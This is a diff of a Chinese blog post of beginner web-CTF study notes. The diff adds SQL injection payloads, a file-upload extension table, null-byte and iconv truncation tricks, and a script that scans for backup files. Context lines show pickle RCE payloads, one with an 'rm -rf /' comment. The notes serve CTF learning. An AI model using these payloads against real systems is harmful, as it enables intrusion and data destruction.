@@ -28,11 +28,11 @@
 <meta property="og:description" content="个人web小白题刷题笔记">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-02-23T12:20:33.000Z">
-<meta property="article:modified_time" content="2025-05-28T11:22:44.196Z">
+<meta property="article:modified_time" content="2025-06-06T13:01:56.901Z">
 <meta property="article:author" content="guayu-kakeru">
-<meta property="article:tag" content="笔记">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="web">
+<meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://guayu-kakeru.github.io/posts/59777.html">
@@ -226,7 +226,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-05-28 19:22:44" itemprop="dateModified" datetime="2025-05-28T19:22:44+08:00">2025-05-28</time>
+                <time title="修改时间：2025-06-06 21:01:56" itemprop="dateModified" datetime="2025-06-06T21:01:56+08:00">2025-06-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -283,6 +283,10 @@
 </ul>
 <h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><ul>
 <li>md5相同但是字符串不同：<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) = <span class="number">0</span>e462097431906509019562988736854</span><br><span class="line">   <span class="built_in">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>) = <span class="number">0</span>e830400451993494058024219903391</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabg7XSs&#x27;</span>)</span></span> = <span class="number">0</span>e087386482136013740957780965295</span><br><span class="line"><span class="function"><span class="title">md5</span><span class="params">(<span class="string">&#x27;aabC9RqS&#x27;</span>)</span></span> = <span class="number">0</span>e260421314791580664869894734725</span><br><span class="line">   <span class="number">314282422</span>    QLTHNDT   EEIZDOI</span><br></pre></td></tr></table></figure></div></li>
+<li>双md5都是0e开头的字符串</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">CbDLytmyGm2xQyaLNhWn</span></span><br><span class="line"></span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line"></span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure></div>
+<ul>
 <li>md5($str, false) 这是md5的默认情况 返回32位16进制数   如果是 md5($str, true)就返回16位二进制数<br>ffifdyop 是true参数时候的漏洞  md5 (‘ffifdyop’,true)&#x3D;’or’6xxxxxx 也就是or了一个true</li>
 <li>在 PHP 中，如果 <code>md5()</code> 作用于一个<strong>数组</strong>，它不会计算哈希，而是返回 <code>NULL</code>，但<strong>不会报错</strong>（因为 <code>error_reporting(0);</code> 关闭了错误输出）。<br>  所以可以用数组来绕过md5验证  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用到场景：</span><br><span class="line">$a !== $b &amp;&amp; md5($a) === md5($b)</span><br></pre></td></tr></table></figure></div>
 <table>
@@ -381,6 +385,9 @@
 <li>mysql中的substr索引从1开始不是0 </li>
 <li>sql报错注入的<code>extractvalue</code>和<code>updatexml</code>函数只能返回<code>32</code>个字符  right(),left()，substr()来截取字符串</li>
 <li>sql有回显的时候，不能用注释符号的时候，可以用sql中的字符运算’username’:”0’+ascii(substr((select * from flag) from “+str(i+1)+” for 1))+’0”   <a href="https://guayu-kakeru.github.io/posts/19220.html">unfinish</a></li>
+<li>如果选择数据库，回显出来是0说明可能是进制有问题，可以选择用hex转成16进制，但是如果数据库中带有数字或者字母会出现英文，如果都是数字，可能是英文被过滤。可以考虑把16进制转成10进制，然后在显示如 <code>&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg</code></li>
+<li>在mysql中，字符串和数字类型也可以比较，比较之前字符串会转化成0   可以构造payload <code>admin&#39; -0-&#39;</code> 因为原始插入语句可能是<code>SELECT * FROM users WHERE username = &#39;admin&#39;-0-&#39; AND password = &#39;xxx&#39;;</code> 插入之后出现表达式0 - 0 &#x3D; 0 然后数据库中用户名的字段是字符串，和0比较也是0 所以可以实现sql注入</li>
+<li>过滤空格和逗号，要读取数据可以用类似<code>select mid((&#39;123&#39;)from(1)for(2))</code></li>
 </ul>
 <h2 id="ctf中的linux"><a href="#ctf中的linux" class="headerlink" title="ctf中的linux"></a>ctf中的linux</h2><ul>
 <li>nl 命令在 <a target="_blank" rel="noopener" href="http://codex.wordpress.org.cn/Linux">linux</a> 系统中用来计算文件中行号。nl 可以将输出的文件内容自动的加上行号！其默认的结果与 cat -n 有点不太一样， nl 可以将行号做比较多的显示设计，包括位数与是否自动补齐 0 等等的功能。（一般对输入字符有限制的时候用</li>
@@ -400,9 +407,30 @@
 <li>linux中的mac地址在<code>/sys/class/net/eth0/address</code>  如果用mac地址作为随机种子，要去掉冒号，然后加上0x变成十六进制，因为随机种子一般是1位</li>
 <li>nginx配置文件在<code>/usr/local/nginx/conf/nginx.conf</code></li>
 <li><code>find / -name &#39;*&#39; -exec grep -H &#39;NSS&#39; &#123;&#125; \; 2&gt;/dev/null</code> 藏flag的时候这么找所有的</li>
+<li>过滤空格可以使用<code>cat&lt;/flag</code>得到flag 重定向也可以写成<code>&amp;amp;lt;</code></li>
 </ul>
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
-<li><code>php3，php5，pht，phtml，phps</code> 都是 php 可运行的文件扩展名</li>
+<li><code>php3，php5，pht，phtml，phps</code> 都是 php 可运行的文件扩展名 下面是扩展名表<table>
+<thead>
+<tr>
+<th align="left">语言</th>
+<th align="left">可解析后缀</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>ASP&#x2F;ASPX</strong></td>
+<td align="left"><code>asp</code>, <code>aspx</code>, <code>asa</code>, <code>ascx</code>, <code>ashx</code>, <code>asmx</code>, <code>cer</code>, <code>cdx</code></td>
+</tr>
+<tr>
+<td align="left"><strong>PHP</strong></td>
+<td align="left"><code>php</code>, <code>php5</code>, <code>php4</code>, <code>php3</code>, <code>phtml</code>, <code>pht</code></td>
+</tr>
+<tr>
+<td align="left"><strong>JSP</strong></td>
+<td align="left"><code>jsp</code>, <code>jspx</code>, <code>jspa</code>, <code>jsw</code>, <code>jsv</code>, <code>jspf</code>, <code>jtml</code></td>
+</tr>
+</tbody></table>
+</li>
 <li><code>.htaccess</code> 是一个纯文本文件，它里面存放着 Apache 服务器配置相关的指令。<br> .htaccess 主要的作用有：URL 重写、自定义错误页面、MIME 类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义 404 错误页面、阻止 &#x2F; 允许特定 IP&#x2F;IP 段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。<br> .htaccess 的用途范围主要针对当前目录。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># jpg文件解析成php文件</span></span><br><span class="line">   <span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div></li>
 <li>在 php 中 <code>&quot;.user.ini&quot;</code> 有如下解释：php 会在每个目录下搜寻文件名，如果设定为空字符串则 php 不会搜寻，也就是在 “.user.ini” 中如果设置了文件    名，那么任意一个页面都将该文件中的内容包含进去。有两种方法：<br> auto_prepend_file: 在页面顶部加载文件<br> auto_append_file: 在页面底部加载文件<br> 而且这种方式解析的文件都会被当作php文件执行，在一些文件上传题目也会碰到</li>
 <li>在文件内容的开头输入 <code>GIF89a</code> 主要用于绕过 <strong>MIME 类型检测</strong> 和 <strong>Web 服务器的文件格式验证</strong>，在有检测上传文件类型的题目中可以在修改成jpg文件的前面加上这句</li>
@@ -413,8 +441,11 @@
 <li>双后缀绕过文件上传限制的时候，gif可以在文件头写GIF89a然后插入php代码，gif这个后缀名有时候会执行php文件</li>
 </ul>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php reverse shell</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-
+<ul>
+<li>在一些情况，文件的后缀被白名单限制死，但是<code>文件名被保存到服务器中</code>，然后前端从数据库中获取文件名，可能造成sql注入 尝试上传select.jpg</li>
+<li>php<code>0x00 %00</code>空白字符截断 原理是最后被解析成chr(0) 这是一个空白字符，空白字符后的内容会被截断造成绕过  漏洞版本很老不常见：php版本小于5.3.4 java版本小于7u40</li>
+<li><code>iconv 字符转换异常</code>造成截断 utf-8字符集  默认的字符编码范围的是0x00-0x7f  php版本低于5.4  <code>123.php%df.jpg   123.php</code></li>
+</ul>
 <h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><ul>
 <li>php 的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup ();  PHP5 &lt; 5.6.25、PHP7 &lt; 7.0.10</li>
 <li>如果 PHP 代码使用了 <code>__autoload()</code> 或 <code>spl_autoload_register()</code>，那么在 <code>unserialize()</code> 时，PHP 会尝试自动加载不存在的类。攻击者可能通过控制 <code>autoload</code> 机制，使其加载恶意代码。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   spl_autoload_register(function(<span class="variable">$class</span>) &#123;</span><br><span class="line">    include <span class="string">&quot;/tmp/<span class="variable">$class</span>.php&quot;</span>; <span class="regexp">//</span> 如果 <span class="class"><span class="keyword">class</span> 不存在，会自动尝试加载</span></span><br><span class="line"><span class="class">&#125;)</span>;</span><br><span class="line"></span><br><span class="line">unserialize(<span class="string">&#x27;O:8:&quot;Malicious&quot;:0:&#123;&#125;&#x27;</span>); <span class="regexp">//</span>假设类 Malicious 不存在，PHP 会通过已注册的自动加载函数尝试加载 /tmp/Malicious.php 文件</span><br></pre></td></tr></table></figure></div></li>
@@ -435,7 +466,42 @@
 <p>示例</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;获取属性 &#x27;<span class="subst">$name</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;设置属性 &#x27;<span class="subst">$name</span>&#x27; 为 &#x27;<span class="subst">$value</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span> = <span class="keyword">new</span> <span class="title class_">Example</span>();</span><br><span class="line"><span class="variable">$example</span>-&gt;property = <span class="string">&#x27;value&#x27;</span>; <span class="comment">// 调用 __set()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$example</span>-&gt;property;      <span class="comment">// 调用 __get()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">设置属性 <span class="string">&#x27;property&#x27;</span> 为 <span class="string">&#x27;value&#x27;</span></span><br><span class="line">获取属性 <span class="string">&#x27;property&#x27;</span></span><br><span class="line">value</span><br></pre></td></tr></table></figure></div>
 <ul>
-<li><strong><code>__debugInfo()</code></strong>：使用 <code>var_dump()</code> 打印对象时自动调用。<strong><code>__sleep()</code></strong>：使用 <code>serialize()</code> 函数序列化对象时自动调用。</li>
+<li><p><strong><code>__debugInfo()</code></strong>：使用 <code>var_dump()</code> 打印对象时自动调用。<strong><code>__sleep()</code></strong>：使用 <code>serialize()</code> 函数序列化对象时自动调用。</p>
+</li>
+<li><p>php中不同属性的区别</p>
+<table>
+<thead>
+<tr>
+<th>属性类型</th>
+<th>可见性</th>
+<th>前缀示例</th>
+<th>URL中表示</th>
+<th>示例序列化片段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Public</td>
+<td>所有地方均可访问</td>
+<td>无前缀</td>
+<td>-</td>
+<td><code>s:2:&quot;op&quot;;i:2;</code></td>
+</tr>
+<tr>
+<td>Protected</td>
+<td>类及其子类可访问</td>
+<td><code>\0*\0</code></td>
+<td><code>%00*%00</code></td>
+<td><code>s:5:&quot;\0*\0op&quot;;i:2;</code></td>
+</tr>
+<tr>
+<td>Private</td>
+<td>仅类自身可访问</td>
+<td><code>\0类名\0</code></td>
+<td><code>%00类名%00</code></td>
+<td><code>s:11:&quot;\0Test\0op&quot;;i:2;</code></td>
+</tr>
+</tbody></table>
+</li>
 </ul>
 <h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><ul>
 <li>ssrf中有限制长度的时候，可以用0 0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0</li>
@@ -478,6 +544,8 @@
 </li>
 <li><p>hex分为普通的hex和asciihex  字符串的时候用asciihex ASCII Hex 用于字符串存储和传输，因为它能保证数据是可读的 ASCII 字符，不会引起协议解析问题。 比如一个hex 41拆成字符4和1 然后找到对应的ascii码 就是3431</p>
 </li>
+<li><p>有时候执行env 可能就会出flag</p>
+</li>
 </ul>
 <h2 id="其他语言知识"><a href="#其他语言知识" class="headerlink" title="其他语言知识"></a>其他语言知识</h2><ul>
 <li>在 Python 正则表达式中，”.” 表示匹配除了换行符之外的任意单个字符，”<em>“ 表示匹配前面的字符零次或多次。因此，”.</em>“ 表示匹配任意长度的字符序列，这也被称为贪婪匹配 (greedy matching)。 注意到这个除了换行符以外，所以可以用<code>%a</code>绕过一些正则匹配，前面是换行就匹配不到</li>
@@ -487,6 +555,22 @@
 <li>python 中的pickle反序列化漏洞： pickle.loads()是不安全的！ 它可以执行任意 Python 代码，如果攻击者构造恶意的 pickle 数据，就能远程执行命令(RCE)<br>   <strong>利用方式</strong> ：攻击者可以构造一个恶意 <code>pickle</code> 对象，其中包含一个 <code>os.system(&quot;command&quot;)</code>，然后将其 Base64 编码并提交到 <code>/import</code> 端点。  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">import</span> pickle</span><br><span class="line">   <span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&quot;touch /tmp/hacked&quot;</span>,))  <span class="comment"># 或者 &quot;rm -rf /&quot;</span></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pickle.dumps(Exploit())).decode()	</span><br><span class="line"><span class="built_in">print</span>(payload)  <span class="comment"># 生成恶意 Base64 字符串</span></span><br></pre></td></tr></table></figure></div>
   opcode版本  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,pickletools  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos  </span></span><br><span class="line"><span class="string">system  </span></span><br><span class="line"><span class="string">(S&#x27;mkdir static &amp;&amp; set &gt; ./static/1&#x27;  </span></span><br><span class="line"><span class="string">tR.  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line">pickletools.dis(opcode)  </span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode).decode())</span><br></pre></td></tr></table></figure></div></li>
 <li>flask框架题里面，可以访问任意的url的时候 在<code>/proc/self/cmdline</code> 可以读取当前进程的命令，所以可以得到所在的路由</li>
+</ul>
+<h2 id="信息泄漏"><a href="#信息泄漏" class="headerlink" title="信息泄漏"></a>信息泄漏</h2><ul>
+<li>git文件泄漏  工具 Githack  <a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
+<li>.svn信息泄露 工具 dvcs-ripper <a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a>  cd到工具目录下的.svn&#x2F;pristine&#x2F;查看内容</li>
+<li>.hg信息泄漏 Mercurial 是一种轻量级分布式版本控制系统，使用 hg init的时候会生成.hg。 工具dvcs-ripper  cd到.hg目录，用grep -r flag *命令搜索有flag关键字的文件</li>
+<li>brz信息泄漏 工具 dvcs-ripper CVS&#x2F;Root和CVS&#x2F;Entries, 分别记录了项目的根信息和所有文件的结构</li>
+<li>网站源码泄漏  后缀 zip,tar,rar,tar.gz  文件名 www wwwroot web website backup back temp  有时index.php.bak也会有泄漏</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单扫描脚本</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url&quot;</span></span><br><span class="line"></span><br><span class="line">li1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">li2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot;.&quot;</span> + j</span><br><span class="line">        r = requests.get(url_final)</span><br><span class="line">        <span class="comment"># 修正拼接，输出响应状态码和最终 URL，也可根据需求改输出响应文本等</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;状态码: <span class="subst">&#123;r.status_code&#125;</span>, URL: <span class="subst">&#123;url_final&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>vim -r 可以查看后缀为.swp的备份文件</li>
+<li>WEB-INF&#x2F;web.xml 泄漏 这是java应用中通常不允许被访问到的目录，在有些情况由于错误的配置或者由目录便利可以读到这个目录中的内容</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WEB-<span class="keyword">INF</span>/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-<span class="keyword">INF</span>/database.properties : 数据库配置文件</span><br><span class="line">WEB-<span class="keyword">INF</span>/classes/ : 一般用来存放Java类文件(.<span class="keyword">class</span>)</span><br><span class="line">WEB-<span class="keyword">INF</span>/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-<span class="keyword">INF</span>/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>Apache&#x2F;Nginx错误配置<br>Windows IIS&#x2F;Apache 目录穿越 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/21516413">https://zhuanlan.zhihu.com/p/21516413</a><br>Nginx配置安全 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></li>
 </ul>
 
     </div>
@@ -514,9 +598,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
               <a href="/tags/CTF/" rel="tag"># CTF</a>
               <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
           </div>
 
         
@@ -590,7 +674,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#http"><span class="nav-text">http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5"><span class="nav-text">md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%9F%A5%E8%AF%86"><span class="nav-text">php知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf%E4%B8%AD%E7%9A%84linux"><span class="nav-text">ctf中的linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf"><span class="nav-text">ssrf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%86%E8%8A%82"><span class="nav-text">细节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86"><span class="nav-text">其他语言知识</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#http"><span class="nav-text">http</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5"><span class="nav-text">md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%9F%A5%E8%AF%86"><span class="nav-text">php知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf%E4%B8%AD%E7%9A%84linux"><span class="nav-text">ctf中的linux</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssrf"><span class="nav-text">ssrf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%86%E8%8A%82"><span class="nav-text">细节</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E8%AF%AD%E8%A8%80%E7%9F%A5%E8%AF%86"><span class="nav-text">其他语言知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F"><span class="nav-text">信息泄漏</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
